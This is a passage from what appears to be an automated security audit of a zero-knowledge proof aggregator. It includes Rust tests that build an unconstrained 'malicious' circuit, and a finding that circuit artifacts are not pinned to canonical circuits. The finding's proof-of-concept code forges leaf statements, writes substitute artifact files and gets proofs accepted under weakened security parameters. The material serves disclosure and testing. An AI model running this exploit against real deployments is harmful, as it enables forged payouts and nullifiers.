         let block_hashes_felts: [[F; 4]; 8] = BLOCK_HASHES.map(limbs4_u64_to_felts);
         let nullifiers_felts: [[F; 4]; 8] = NULLIFIERS.map(limbs4_u64_to_felts);
 
         let common_block_hash = block_hashes_felts[0];
         let common_block_number = F::from_canonical_u64(42);
         let asset_id = F::from_canonical_u64(TEST_ASSET_ID_U64);
 
         let mut pis_list: Vec<[F; LEAF_PI_LEN]> = Vec::with_capacity(8);
         for i in 0..8 {
             // Proof 3 has a different volume_fee_bps
             let volume_fee_bps = if i == 3 { volume_fee_b } else { volume_fee_a };
             pis_list.push(make_pi_from_felts(
                 asset_id,
                 output_felts[i],
                 F::ZERO,
                 volume_fee_bps,
                 nullifiers_felts[i],
                 exits_felts[i],
                 [F::ZERO; 8],
                 common_block_hash,
                 common_block_number,
             ));
         }
 
         let leaves = pis_list
             .into_iter()
             .map(prove_fake_leaf_standalone)
             .collect::<Vec<_>>();
         let leaf_common = leaves[0].1.common.clone();
         let leaf_verifier_only = leaves[0].1.verifier_only.clone();
         let proofs = leaves
             .into_iter()
             .map(|(proof, _)| proof)
             .collect::<Vec<_>>();
         let dummy_nullifier_pre_images = deterministic_dummy_nullifier_pre_images(proofs.len());
 
         let res = aggregate_proofs_private_batch(
             proofs,
             leaf_common,
             leaf_verifier_only,
             dummy_nullifier_pre_images,
         );
 
         assert!(
             res.is_err(),
             "expected failure due to mismatched volume_fee_bps"
         );
     }
 
     #[test]
     fn recursive_aggregation_tree_exit_sum_overflow_fails() {
         // Test that exit amounts near u32::MAX that would overflow when summed are rejected
         // Use exit accounts that will collide (same account for multiple proofs)
         // so their amounts get summed
         let common_exit: [F; 8] = limbs8_u64_to_felts(EXIT_ACCOUNTS[0]);
         let nullifiers_felts: [[F; 4]; 8] = NULLIFIERS.map(limbs4_u64_to_felts);
         let block_hashes_felts: [[F; 4]; 8] = BLOCK_HASHES.map(limbs4_u64_to_felts);
 
         let common_block_hash = block_hashes_felts[0];
         let common_block_number = F::from_canonical_u64(42);
         let asset_id = F::from_canonical_u64(TEST_ASSET_ID_U64);
         let volume_fee_bps = F::from_canonical_u64(TEST_VOLUME_FEE_BPS);
 
         // Each proof has output near u32::MAX / 2, so 3+ proofs to same exit will overflow
         let large_amount = F::from_canonical_u64((u32::MAX / 2) as u64);
 
         let mut pis_list: Vec<[F; LEAF_PI_LEN]> = Vec::with_capacity(8);
         for nullifier in &nullifiers_felts {
             pis_list.push(make_pi_from_felts(
                 asset_id,
                 large_amount, // All proofs send to same exit, will overflow u32
                 F::ZERO,
                 volume_fee_bps,
                 *nullifier,
                 common_exit, // Same exit account for all
                 [F::ZERO; 8],
                 common_block_hash,
                 common_block_number,
             ));
         }
 
         let leaves = pis_list
             .into_iter()
             .map(prove_fake_leaf_standalone)
             .collect::<Vec<_>>();
         let leaf_common = leaves[0].1.common.clone();
         let leaf_verifier_only = leaves[0].1.verifier_only.clone();
         let proofs = leaves
             .into_iter()
             .map(|(proof, _)| proof)
             .collect::<Vec<_>>();
         let dummy_nullifier_pre_images = deterministic_dummy_nullifier_pre_images(proofs.len());
 
         let res = aggregate_proofs_private_batch(
             proofs,
             leaf_common,
             leaf_verifier_only,
             dummy_nullifier_pre_images,
         );
 
         assert!(
             res.is_err(),
             "expected failure due to exit sum overflow (exceeds 32-bit range)"
         );
     }
 
     #[test]
     fn recursive_aggregation_dummy_nullifiers_are_replaced() {
         // Verify that dummy proof nullifiers are actually replaced with hashes of pre-images
         // (more thorough check than the existing mixed-dummy test)
         let exits_felts: [[F; 8]; 8] = EXIT_ACCOUNTS.map(limbs8_u64_to_felts);
         let block_hashes_felts: [[F; 4]; 8] = BLOCK_HASHES.map(limbs4_u64_to_felts);
         let nullifiers_felts: [[F; 4]; 8] = NULLIFIERS.map(limbs4_u64_to_felts);
 
         let common_block_hash = block_hashes_felts[0];
         let common_block_number = F::from_canonical_u64(42);
         let asset_id = F::from_canonical_u64(TEST_ASSET_ID_U64);
         let volume_fee_bps = F::from_canonical_u64(TEST_VOLUME_FEE_BPS);
 
         let mut pis_list: Vec<[F; LEAF_PI_LEN]> = Vec::with_capacity(8);
 
         // 1 real proof
         pis_list.push(make_pi_from_felts(
             asset_id,
             F::from_canonical_u64(100),
             F::ZERO,
             volume_fee_bps,
             nullifiers_felts[0],
             exits_felts[0],
             [F::ZERO; 8],
             common_block_hash,
             common_block_number,
         ));
 
         // 7 dummy proofs with distinct nullifiers that should be replaced
         let dummy_exit = [F::ZERO; 8];
         let dummy_block_hash = [F::ZERO; 4];
         for nullifier in nullifiers_felts.iter().skip(1) {
             pis_list.push(make_pi_from_felts(
                 asset_id,
                 F::ZERO,
                 F::ZERO,
                 volume_fee_bps,
                 *nullifier, // Original nullifier (should be replaced)
                 dummy_exit,
                 dummy_exit,
                 dummy_block_hash,
                 F::ZERO,
             ));
         }
 
         let leaves = pis_list
             .clone()
             .into_iter()
             .map(prove_fake_leaf_standalone)
             .collect::<Vec<_>>();
         let leaf_common = leaves[0].1.common.clone();
         let leaf_verifier_only = leaves[0].1.verifier_only.clone();
         let proofs = leaves
             .into_iter()
             .map(|(proof, _)| proof)
             .collect::<Vec<_>>();
 
         let dummy_nullifier_pre_images = deterministic_dummy_nullifier_pre_images(proofs.len());
 
         let (root_proof, root_verifier) = aggregate_proofs_private_batch(
             proofs,
             leaf_common,
             leaf_verifier_only,
             dummy_nullifier_pre_images.clone(),
         )
         .unwrap();
 
         root_verifier.verify(root_proof.clone()).unwrap();
 
         let pis = &root_proof.public_inputs;
         let nullifier_region_start =
             ROOT_HEADER_LEN + (pis_list.len() * 2 * aggregated_output::EXIT_SLOT_LEN);
 
         // Check real proof nullifier is preserved
         let real_nullifier_idx = nullifier_region_start;
         let real_nullifier_got = [
             pis[real_nullifier_idx],
             pis[real_nullifier_idx + 1],
             pis[real_nullifier_idx + 2],
             pis[real_nullifier_idx + 3],
         ];
         assert_eq!(
             real_nullifier_got, nullifiers_felts[0],
             "real proof nullifier should be preserved"
         );
 
         // Check ALL dummy nullifiers are replaced (not equal to original)
         for i in 1..8 {
             let idx = nullifier_region_start + i * 4;
             let got = [pis[idx], pis[idx + 1], pis[idx + 2], pis[idx + 3]];
             let original = nullifiers_felts[i];
             let expected_replacement =
                 hash_dummy_nullifier_pre_image_native(dummy_nullifier_pre_images[i]);
 
             assert_ne!(
                 got, original,
                 "dummy nullifier at index {i} should NOT equal original"
             );
             assert_eq!(
                 got, expected_replacement,
                 "dummy nullifier at index {i} should equal H(H(pre_image))"
             );
         }
 
         println!(
             "Verified dummy nullifier replacement for {} dummy proofs",
             7
         );
     }
 
     // =========================================================================
     // Security tests: Verifier key substitution attack prevention
     // =========================================================================
 
     /// Build a MALICIOUS circuit - same PI count as leaf, but NO security constraints.
     fn build_malicious_leaf_circuit() -> (CircuitData<F, C, D>, Vec<Target>) {
         let config = CircuitConfig::standard_recursion_config();
         let mut builder = CircuitBuilder::<F, D>::new(config);
 
         let pis: Vec<_> = (0..LEAF_PI_LEN)
             .map(|_| builder.add_virtual_target())
             .collect();
 
         // NO constraints! Attacker can set any values.
 
         let targets = pis.clone();
         builder.register_public_inputs(&pis);
         (builder.build::<C>(), targets)
     }
 
     /// Test that private-batch rejects proofs from a malicious circuit when built with
     /// the legitimate verifier key baked in as constants.
     #[test]
     fn private_batch_rejects_malicious_circuit_proofs() {
         // Build the "legitimate" leaf circuit (with real constraints)
         let (legit_circuit, _legit_targets) = build_fake_leaf_circuit();
 
         // Build a MALICIOUS circuit (no constraints)
         let (malicious_circuit, malicious_targets) = build_malicious_leaf_circuit();
 
         // Build private-batch with LEGITIMATE verifier key baked in
         let private_batch_config = CircuitConfig::standard_recursion_config();
         let private_batch_circuit = PrivateBatchCircuit::new(
             private_batch_config,
             &legit_circuit.common,
             &legit_circuit.verifier_only, // SECURITY: Baked as constants
             1,
         );
         let private_batch_targets = private_batch_circuit.targets();
         let private_batch_data = private_batch_circuit.build_circuit();
 
         // Generate a malicious proof with FAKE values
         let fake_public_inputs: [u64; LEAF_PI_LEN] = [
             999,        // asset_id
             0xFFFFFFFF, // output_amount_1 - would fail range_check in legit circuit
             0xFFFFFFFF, // output_amount_2 - would fail range_check in legit circuit
             9999,       // volume_fee_bps - way over 100%
             0xDEADBEEF, 0xCAFEBABE, 0x12345678, 0x87654321, // fake nullifier
             0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, 0xDDDDDDDD, // fake exit_1
             0xEEEEEEEE, 0xFFFFFFFF, 0x11111111, 0x22222222, // fake exit_2
             0x33333333, 0x44444444, 0x55555555, 0x66666666, // fake block_hash
             9999999,    // fake block_number
         ];
 
         let mut pw = PartialWitness::new();
         for (i, &val) in fake_public_inputs.iter().enumerate() {
             pw.set_target(malicious_targets[i], F::from_canonical_u64(val))
                 .unwrap();
         }
 
         let malicious_proof = malicious_circuit.prove(pw).expect("prove malicious");
 
         // Try to use malicious proof in private-batch - this should FAIL
         let mut pw = PartialWitness::new();
         pw.set_proof_with_pis_target(&private_batch_targets.leaf_proofs[0], &malicious_proof)
             .unwrap();
 
         for pre_image in &private_batch_targets.dummy_nullifier_pre_images {
             for (i, &t) in pre_image.iter().enumerate() {
                 pw.set_target(t, F::from_canonical_u64(i as u64)).unwrap();
             }
         }
 
         // private-batch proof generation should FAIL because the proof doesn't match the baked verifier key
         let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
             private_batch_data.prove(pw)
         }));
         assert!(
             result.is_err() || result.unwrap().is_err(),
             "private-batch should reject proofs from malicious circuit"
         );
     }
 
     /// Test that private-batch correctly accepts legitimate proofs after the security fix.
     #[test]
     fn private_batch_accepts_legitimate_proofs_after_fix() {
         // Build legitimate circuit
         let (legit_circuit, legit_targets) = build_fake_leaf_circuit();
 
         // Build private-batch with legitimate verifier key baked in
         let private_batch_config = CircuitConfig::standard_recursion_config();
         let private_batch_circuit = PrivateBatchCircuit::new(
             private_batch_config,
             &legit_circuit.common,
             &legit_circuit.verifier_only,
             1,
         );
         let private_batch_targets = private_batch_circuit.targets();
         let private_batch_data = private_batch_circuit.build_circuit();
 
         // Generate a LEGITIMATE proof with valid values
         let valid_public_inputs: [u64; LEAF_PI_LEN] = [
             0,    // asset_id
             1000, // output_amount_1 - valid u32
             2000, // output_amount_2 - valid u32
             100,  // volume_fee_bps - valid (1%)
             0x11111111, 0x22222222, 0x33333333, 0x44444444, // nullifier
             0x11111111, 0x22222222, 0x33333333, 0x44444444, // exit_1
             0x55555555, 0x66666666, 0x77777777, 0x88888888, // exit_2
             0x99999999, 0xAAAAAAAA, 0xBBBBBBBB, 0xCCCCCCCC, // block_hash
             12345,      // block_number
         ];
 
         let mut pw = PartialWitness::new();
         for (i, &val) in valid_public_inputs.iter().enumerate() {
             pw.set_target(legit_targets[i], F::from_canonical_u64(val))
                 .unwrap();
         }
 
         let legit_proof = legit_circuit.prove(pw).expect("prove legit");
 
         // Use legitimate proof in private-batch - this should succeed
         let mut pw = PartialWitness::new();
         pw.set_proof_with_pis_target(&private_batch_targets.leaf_proofs[0], &legit_proof)
             .unwrap();
 
         for pre_image in &private_batch_targets.dummy_nullifier_pre_images {
             for (i, &t) in pre_image.iter().enumerate() {
                 pw.set_target(t, F::from_canonical_u64(i as u64)).unwrap();
             }
         }
 
         let private_batch_proof = private_batch_data
             .prove(pw)
             .expect("private-batch prove should succeed");
         private_batch_data
             .verify(private_batch_proof)
             .expect("private-batch verify should succeed");
     }
 }
```

### Affected files
- `wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs`

### Validation output

```
[output truncated: 47 lines & 64.9912109375 KB skipped]
   5: poc::poc_partial_private_batch_padding_fixed_fee_breaks_nondefault_fee_and_drains_buffer::{{closure}}
             at ./tests/poc.rs:70:89
   6: core::ops::function::FnOnce::call_once
             at /home/v12/.rustup/toolchains/1.93.0-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/core/src/ops/function.rs:250:5
   7: core::ops::function::FnOnce::call_once
             at /rustc/254b59607d4417e9dffbc307138ae5c86280fe4c/library/core/src/ops/function.rs:250:5
note: Some details are omitted, run with `RUST_BACKTRACE=full` for a verbose backtrace.
error: test failed, to rerun pass `-p tests --test poc`

[output truncated: kept tail 64.0 KiB of 439.3 KiB total, 375.3 KiB dropped] full output: /tmp/v12-out-101933-18c03f2ab71ea827-0.out
```

---

# Circuit artifacts are not pinned to canonical circuits
**#97069**
- Severity: High
- Validity: Unreviewed

## Source locations

### `wormhole/aggregator/src/common/utils.rs`
#### Lines 13-30 — _Deserializer returns verifier data without any canonical-circuit or semantic-layout check._

```
pub fn load_verifier_data_from_bytes(
    common_bytes: &[u8],
    verifier_only_bytes: &[u8],
    label: &str,
) -> Result<VerifierCircuitData<F, C, D>> {
    let gate_serializer = DefaultGateSerializer;

    let common = CommonCircuitData::from_bytes(common_bytes.to_vec(), &gate_serializer)
        .map_err(|e| anyhow!("failed to deserialize {} common data: {}", label, e))?;

    let verifier_only =
        VerifierOnlyCircuitData::<C, D>::from_bytes(verifier_only_bytes.to_vec())
            .map_err(|e| anyhow!("failed to deserialize {} verifier-only data: {}", label, e))?;

    Ok(VerifierCircuitData {
        verifier_only,
        common,
    })
```

### `wormhole/aggregator/src/private_batch/prover/lib.rs`
#### Lines 116-128 — _Private-batch prover reconstructs recursive targets from the unchecked loaded leaf verifier data._

```
        // 2) Load leaf verifier data (needed to reconstruct targets + parse dummy proof)
        let leaf_verifier_data =
            load_verifier_data_from_bytes(leaf_common_bytes, leaf_verifier_only_bytes, "leaf")?;

        // 3) Reconstruct the aggregation circuit to get targets.
        // NOTE: This builds a fresh circuit to extract target structure. The verifier key
        // must match what was used when the prebuilt binaries were created.
        let circuit = PrivateBatchCircuit::new(
            agg_common.config.clone(),
            &leaf_verifier_data.common,
            &leaf_verifier_data.verifier_only,
            num_leaf_proofs,
        );
```

### `wormhole/aggregator/src/private_batch/circuit/circuit_logic.rs`
#### Lines 56-74 — _Private-batch circuit verifies leaf proofs using the supplied leaf common and verifier-only data._

```
    /// Build a monolithic private-batch aggregation circuit that verifies `n_leaf` wormhole leaf proofs.
    ///
    /// The `leaf_verifier_only` is baked in as constants to prevent verifier key substitution.
    pub fn new(
        config: CircuitConfig,
        leaf_common: &CommonCircuitData<F, D>,
        leaf_verifier_only: &VerifierOnlyCircuitData<C, D>,
        n_leaf: usize,
    ) -> Self {
        assert!(n_leaf > 0, "n_leaf must be > 0");

        let mut builder = CircuitBuilder::<F, D>::new(config);

        let leaf_proofs = add_recursive_verifiers::<F, C, D>(
            &mut builder,
            leaf_common,
            leaf_verifier_only,
            n_leaf,
        );
```

### `wormhole/aggregator/src/common/recursive.rs`
#### Lines 78-86 — _Recursive verifier bakes the supplied verifier key as constants and verifies inner proofs against it._

```
    // SECURITY: Bake the verifier key as constants (shared across all proofs).
    let verifier_data = builder.constant_verifier_data::<C>(inner_verifier_only);

    // Add virtual proof targets and verification for each
    let mut proofs = Vec::with_capacity(num_proofs);
    for _ in 0..num_proofs {
        let proof = builder.add_virtual_proof_with_pis(inner_common);
        builder.verify_proof::<C>(&proof, &verifier_data, inner_common);
        proofs.push(proof);
```

### `wormhole/aggregator/src/private_batch/circuit/build.rs`
#### Lines 34-42 — _Private-batch artifact generation loads leaf common/verifier files and builds batch artifacts from them._

```
    let leaf_common = load_leaf_common_data(&output_path.join("common.bin"))?;
    let leaf_verifier_only = load_leaf_verifier_only_data(&output_path.join("verifier.bin"))?;

    let agg_circuit = PrivateBatchCircuit::new(
        wormhole_private_batch_circuit_config(),
        &leaf_common,
        &leaf_verifier_only,
        num_leaf_proofs,
    );
```

### `wormhole/prover/src/lib.rs`
#### Lines 117-149 — _Leaf prover performs a canonical common-data check that the batch loader lacks._

```
    fn ensure_loaded_common_matches_canonical(
        common_data: &CommonCircuitData<F, D>,
    ) -> anyhow::Result<()> {
        let gate_serializer = DefaultGateSerializer;
        let loaded_bytes = common_data
            .to_bytes(&gate_serializer)
            .map_err(|e| anyhow!("failed to serialize loaded common circuit data: {}", e))?;
        let canonical_common = WormholeCircuit::new(common_data.config.clone())
            .build_verifier()
            .common;
        let canonical_bytes = canonical_common
            .to_bytes(&gate_serializer)
            .map_err(|e| anyhow!("failed to serialize canonical Wormhole common data: {}", e))?;

        if loaded_bytes != canonical_bytes {
            bail!(
                "loaded common circuit data does not match the canonical Wormhole circuit for this config"
            );
        }

        Ok(())
    }

    /// Creates a new [`WormholeProver`] from prover and common data bytes.
    pub fn new_from_bytes(prover_only_bytes: &[u8], common_bytes: &[u8]) -> anyhow::Result<Self> {
        let gate_serializer = DefaultGateSerializer;
        let generator_serializer = DefaultGeneratorSerializer::<C, D> {
            _phantom: Default::default(),
        };

        let common_data = CommonCircuitData::from_bytes(common_bytes.to_vec(), &gate_serializer)
            .map_err(|e| anyhow!("failed to deserialize common circuit data: {}", e))?;
        Self::ensure_loaded_common_matches_canonical(&common_data)?;
```

### `wormhole/circuit/src/circuit.rs`
#### Lines 104-122 — _Default uses the intended leaf config, while the public constructor accepts arbitrary `CircuitConfig`._

```
    impl Default for WormholeCircuit {
        /// Creates a WormholeCircuit with the default leaf circuit config (non-ZK).
        ///
        /// Leaf proofs don't need ZK because they're only verified by the aggregator (which runs
        /// in a trusted environment), not on-chain. Disabling ZK improves proving performance.
        fn default() -> Self {
            let config = wormhole_leaf_circuit_config();
            Self::new(config)
        }
    }

    impl WormholeCircuit {
        pub fn new(config: CircuitConfig) -> Self {
            #[cfg(feature = "profile")]
            return Self::new_profiled(config);

            #[cfg(not(feature = "profile"))]
            Self::new_internal(config)
        }
```

### `wormhole/verifier/src/lib.rs` (3 locations)
#### Lines 16-23 — _Documented flow deserializes proofs using the loaded common data and then verifies them._

```
//! // Load verifier from pre-serialized bytes
//! let verifier = WormholeVerifier::new_from_bytes(verifier_bytes, common_bytes)?;
//!
//! // Deserialize the proof
//! let proof = ProofWithPublicInputs::<F, C, D>::from_bytes(proof_bytes, &verifier.circuit_data.common)?;
//!
//! // Verify
//! verifier.verify(proof)?;
```

⋯
#### Lines 100-113 — _Verifier artifact loading deserializes common/verifier data without checking the circuit or config against the intended Wormhole profile._ — _Verifier loader accepts and stores caller-supplied verifier/common circuit data without a canonical Wormhole check._

```
    /// Creates a new [`WormholeVerifier`] from verifier and common data bytes.
    pub fn new_from_bytes(verifier_bytes: &[u8], common_bytes: &[u8]) -> anyhow::Result<Self> {
        let verifier_only = VerifierOnlyCircuitData::from_bytes(verifier_bytes.to_vec())
            .map_err(|e| anyhow!("failed to deserialize verifier data: {}", e))?;

        let common = CommonCircuitData::from_bytes(common_bytes.to_vec(), &DefaultGateSerializer)
            .map_err(|e| anyhow!("failed to deserialize common circuit data: {}", e))?;

        let circuit_data = VerifierCircuitData {
            verifier_only,
            common,
        };

        Ok(Self { circuit_data })
```

⋯
#### Lines 133-136 — _Verification delegates directly to the stored circuit data._

```
    pub fn verify_ref(&self, proof: &ProofWithPublicInputs<F, C, D>) -> anyhow::Result<()> {
        self.circuit_data
            .verify(proof.clone())
            .map_err(|e| anyhow!("proof verification failed: {}", e))
```

### `wormhole/memprof/src/config.rs`
#### Lines 150-202 — _Tooling explicitly treats these configuration knobs as security-weakening and mutates FRI/security fields on `CircuitConfig`._

```
                "the following flags can weaken security: {}\n\
                 pass --allow-weakening-security to acknowledge and proceed",
                violations.join(", ")
            ));
        }
        Ok(())
    }

    pub fn build(&self) -> CircuitConfig {
        let mut cfg = wormhole_private_batch_circuit_config();

        if let Some(mode) = self.zk_mode {
            cfg.zero_knowledge = match mode {
                ZkMode::Rowblinding => true,
                ZkMode::Disabled => false,
            };
        }

        let original_rate = cfg.fri_config.rate_bits;
        let original_queries = cfg.fri_config.num_query_rounds;
        let original_product = original_rate * original_queries;

        if let Some(v) = self.rate_bits {
            cfg.fri_config.rate_bits = v;
            // Preserve `rate_bits * num_query_rounds` product for FRI soundness.
            // Round up to the next integer so we never go below the original.
            let new_queries = original_product.div_ceil(v.max(1));
            cfg.fri_config.num_query_rounds = new_queries;
            eprintln!(
                "[config] rate_bits {} -> {}, auto-adjusted num_query_rounds {} -> {} \
                 (preserving FRI soundness product {})",
                original_rate, v, original_queries, new_queries, original_product
            );
        }

        if let Some(v) = self.cap_height {
            cfg.fri_config.cap_height = v;
        }
        if let Some(v) = self.num_wires {
            cfg.num_wires = v;
        }
        if let Some(v) = self.num_routed_wires {
            cfg.num_routed_wires = v;
        }
        if let Some(v) = self.max_quotient_degree_factor {
            cfg.max_quotient_degree_factor = v;
        }
        if let Some(v) = self.num_query_rounds {
            cfg.fri_config.num_query_rounds = v;
        }
        if let Some(v) = self.security_bits {
            cfg.security_bits = v;
        }
```

### `wormhole/circuit-builder/src/lib.rs` (2 locations)
#### Lines 22-26 — _Circuit builder constructs the Wormhole circuit used to produce canonical artifacts._

```
    println!("Building wormhole leaf circuit (non-ZK for faster proving)...");
    let config = wormhole_leaf_circuit_config();
    let circuit = WormholeCircuit::new(config);
    let targets = circuit.targets();
    let circuit_data = circuit.build_circuit();
```

⋯
#### Lines 50-66 — _Circuit builder serializes the canonical common and verifier-only artifacts._

```
    let verifier_data = circuit_data.verifier_data();
    let prover_data = circuit_data.prover_data();
    let common_data = &verifier_data.common;

    // Serialize common data
    let common_bytes = common_data
        .to_bytes(&gate_serializer)
        .map_err(|e| anyhow!("failed to serialize common data: {}", e))?;
    write(output_path.join("common.bin"), common_bytes)?;
    println!("Common data saved to {}/common.bin", output_path.display());

    // Serialize verifier only data
    let verifier_only_bytes = verifier_data
        .verifier_only
        .to_bytes()
        .map_err(|e| anyhow!("failed to serialize verifier data: {}", e))?;
    write(output_path.join("verifier.bin"), verifier_only_bytes)?;
```

## Description

Multiple artifact-loading paths treat serialized `common` and `verifier_only` bytes as the trust root instead of binding them to the canonical Wormhole circuits and intended security profile. `WormholeVerifier::new_from_bytes` accepts arbitrary circuit data outright, while the prover-side canonicalization rebuilds `WormholeCircuit` from `common_data.config.clone()`, which means a matched artifact set with attacker-chosen `CircuitConfig` still passes validation. The private-batch path has the same trust-boundary flaw: `load_verifier_data_from_bytes` returns unchecked leaf verifier data, and `PrivateBatchCircuit::new` then bakes that supplied verifier key into recursive verification of every inner proof. As a result, substituted artifacts can either change the statement being verified entirely or preserve Wormhole semantics while silently weakening proof soundness. The common fix is to pin every loader and batch builder to canonical circuit identities and approved configs, and to reject any deserialized artifacts whose `common` and `verifier_only` do not match those exact expectations.

## Root cause

Artifact validation trusts deserialized `CommonCircuitData`, `VerifierOnlyCircuitData`, and their embedded `CircuitConfig` instead of checking them against fixed canonical Wormhole and private-batch circuit definitions.

## Impact

Any deployment that accepts circuit artifacts from an untrusted or compromised coordinator can be tricked into verifying proofs for a different circuit, or for the intended circuit under attacker-chosen weaker security parameters. Downstream consumers may therefore accept forged payout, nullifier, asset, or header-related public inputs, or recursively aggregate proofs that never satisfied the intended Wormhole leaf constraints.

## Proof of concept

### Test case

```
use std::{
    fs,
    path::{Path, PathBuf},
    time::{SystemTime, UNIX_EPOCH},
};

use plonky2::{
    field::types::{Field, PrimeField64},
    plonk::proof::ProofWithPublicInputs,
    util::serialization::{DefaultGateSerializer, DefaultGeneratorSerializer},
};
use qp_wormhole_inputs::{BytesDigest, PrivateBatchPublicInputs, PUBLIC_INPUTS_FELTS_LEN};
use test_helpers::{
    fake_leaf::{build_fake_leaf_circuit, prove_fake_leaf},
    TestInputs,
};
use wormhole_aggregator::{
    aggregator::{AggregationBackend, PrivateBatchAggregator},
    private_batch::circuit::circuit_logic::PrivateBatchCircuit,
    CircuitBinsConfig,
};
use wormhole_circuit::{
    circuit::circuit_logic::WormholeCircuit,
    inputs::CircuitInputs,
};
use wormhole_prover::WormholeProver;
use wormhole_verifier::{
    parse_public_inputs, ProofWithPublicInputs as VerifierProofWithPublicInputs, WormholeVerifier,
};
use zk_circuits_common::circuit::{
    wormhole_leaf_circuit_config, wormhole_private_batch_circuit_config, C, D, F,
};

#[derive(Debug, Clone)]
struct ForgedLeafStatement {
    asset_id: u32,
    output_amount_1: u32,
    output_amount_2: u32,
    volume_fee_bps: u32,
    nullifier: BytesDigest,
    exit_account_1: BytesDigest,
    exit_account_2: BytesDigest,
    block_hash: BytesDigest,
    block_number: u32,
}

fn temp_dir(label: &str) -> PathBuf {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    let dir = std::env::temp_dir().join(format!("qp-zk-circuits-poc-{label}-{nanos}"));
    fs::create_dir_all(&dir).unwrap();
    dir
}

fn bytes32_from_limbs(limbs: [u64; 4]) -> [u8; 32] {
    let mut out = [0u8; 32];
    for (i, limb) in limbs.iter().enumerate() {
        out[i * 8..(i + 1) * 8].copy_from_slice(&limb.to_le_bytes());
    }
    out
}

fn digest_from_limbs(limbs: [u64; 4]) -> BytesDigest {
    BytesDigest::try_from(bytes32_from_limbs(limbs)).expect("canonical digest limbs")
}

fn field_digest_limbs(limbs: [u64; 4]) -> [F; 4] {
    limbs.map(F::from_canonical_u64)
}

fn forged_leaf_statement() -> ([F; PUBLIC_INPUTS_FELTS_LEN], ForgedLeafStatement) {
    let statement = ForgedLeafStatement {
        asset_id: 7,
        output_amount_1: 4_242,
        output_amount_2: 1_337,
        volume_fee_bps: 55,
        nullifier: digest_from_limbs([11, 12, 13, 14]),
        exit_account_1: digest_from_limbs([21, 22, 23, 24]),
        exit_account_2: digest_from_limbs([31, 32, 33, 34]),
        block_hash: digest_from_limbs([41, 42, 43, 44]),
        block_number: 777,
    };

    let mut pis = [F::ZERO; PUBLIC_INPUTS_FELTS_LEN];
    pis[0] = F::from_canonical_u32(statement.asset_id);
    pis[1] = F::from_canonical_u32(statement.output_amount_1);
    pis[2] = F::from_canonical_u32(statement.output_amount_2);
    pis[3] = F::from_canonical_u32(statement.volume_fee_bps);
    pis[4..8].copy_from_slice(&field_digest_limbs([11, 12, 13, 14]));
    pis[8..12].copy_from_slice(&field_digest_limbs([21, 22, 23, 24]));
    pis[12..16].copy_from_slice(&field_digest_limbs([31, 32, 33, 34]));
    pis[16..20].copy_from_slice(&field_digest_limbs([41, 42, 43, 44]));
    pis[20] = F::from_canonical_u32(statement.block_number);

    (pis, statement)
}

fn parse_private_batch_from_plonky2(
    proof: &ProofWithPublicInputs<F, C, D>,
) -> PrivateBatchPublicInputs {
    let pis: Vec<u64> = proof
        .public_inputs
        .iter()
        .map(|felt| felt.to_canonical_u64())
        .collect();
    PrivateBatchPublicInputs::try_from_u64_slice(&pis).expect("private-batch public inputs parse")
}

fn build_malicious_private_batch_bins(
    dir: &Path,
) -> anyhow::Result<(ProofWithPublicInputs<F, C, D>, ForgedLeafStatement)> {
    let gate_serializer = DefaultGateSerializer;
    let generator_serializer = DefaultGeneratorSerializer::<C, D> {
        _phantom: Default::default(),
    };

    let (fake_leaf_circuit, fake_leaf_targets) = build_fake_leaf_circuit();
    let dummy_leaf = prove_fake_leaf(&fake_leaf_circuit, &fake_leaf_targets, [F::ZERO; 21]);
    let (forged_leaf_pis, expected) = forged_leaf_statement();
    let forged_leaf = prove_fake_leaf(&fake_leaf_circuit, &fake_leaf_targets, forged_leaf_pis);

    let fake_leaf_verifier = fake_leaf_circuit.verifier_data();
    fs::write(
        dir.join("common.bin"),
        fake_leaf_verifier
            .common
            .to_bytes(&gate_serializer)
            .expect("serialize fake leaf common"),
    )?;
    fs::write(
        dir.join("verifier.bin"),
        fake_leaf_verifier
            .verifier_only
            .to_bytes()
            .expect("serialize fake leaf verifier"),
    )?;
    fs::write(dir.join("dummy_proof.bin"), dummy_leaf.to_bytes())?;

    let private_batch_circuit = PrivateBatchCircuit::new(
        wormhole_private_batch_circuit_config(),
        &fake_leaf_verifier.common,
        &fake_leaf_verifier.verifier_only,
        1,
    )
    .build_circuit();
    let private_batch_verifier = private_batch_circuit.verifier_data();
    let private_batch_prover = private_batch_circuit.prover_data();

    fs::write(
        dir.join("private_batch_common.bin"),
        private_batch_verifier
            .common
            .to_bytes(&gate_serializer)
            .expect("serialize private-batch common"),
    )?;
    fs::write(
        dir.join("private_batch_verifier.bin"),
        private_batch_verifier
            .verifier_only
            .to_bytes()
            .expect("serialize private-batch verifier"),
    )?;
    fs::write(
        dir.join("private_batch_prover.bin"),
        private_batch_prover
            .prover_only
            .to_bytes(&generator_serializer, &private_batch_prover.common)
            .expect("serialize private-batch prover"),
    )?;

    CircuitBinsConfig::new(1, None)?.save(dir)?;

    Ok((forged_leaf, expected))
}

#[test]
fn poc_wormhole_verifier_accepts_weakened_artifacts() {
    let canonical = wormhole_leaf_circuit_config();
    let mut weakened = wormhole_leaf_circuit_config();
    weakened.security_bits = canonical.security_bits.saturating_sub(1).max(1);

    assert_ne!(weakened.security_bits, canonical.security_bits);

    let proof = WormholeProver::new(weakened.clone())
        .commit(&CircuitInputs::test_inputs_0())
        .expect("commit under weakened config")
        .prove()
        .expect("prove under weakened config");

    let weakened_verifier = WormholeCircuit::new(weakened).build_verifier();
    let verifier_bytes = weakened_verifier
        .verifier_only
        .to_bytes()
        .expect("serialize weakened verifier bytes");
    let common_bytes = weakened_verifier
        .common
        .to_bytes(&DefaultGateSerializer)
        .expect("serialize weakened common bytes");

    let loaded = WormholeVerifier::new_from_bytes(&verifier_bytes, &common_bytes)
        .expect("vulnerable verifier loader accepts attacker-chosen config");

    assert_ne!(
        loaded.circuit_data.common.config.security_bits,
        canonical.security_bits,
        "the loaded verifier should carry the attacker-chosen weaker security target"
    );

    let verifier_proof = VerifierProofWithPublicInputs::from_bytes(
        proof.to_bytes(),
        &loaded.circuit_data.common,
    )
    .expect("deserialize proof using attacker-supplied common data");
    loaded
        .verify_ref(&verifier_proof)
        .expect("proof under weakened artifacts must be accepted");

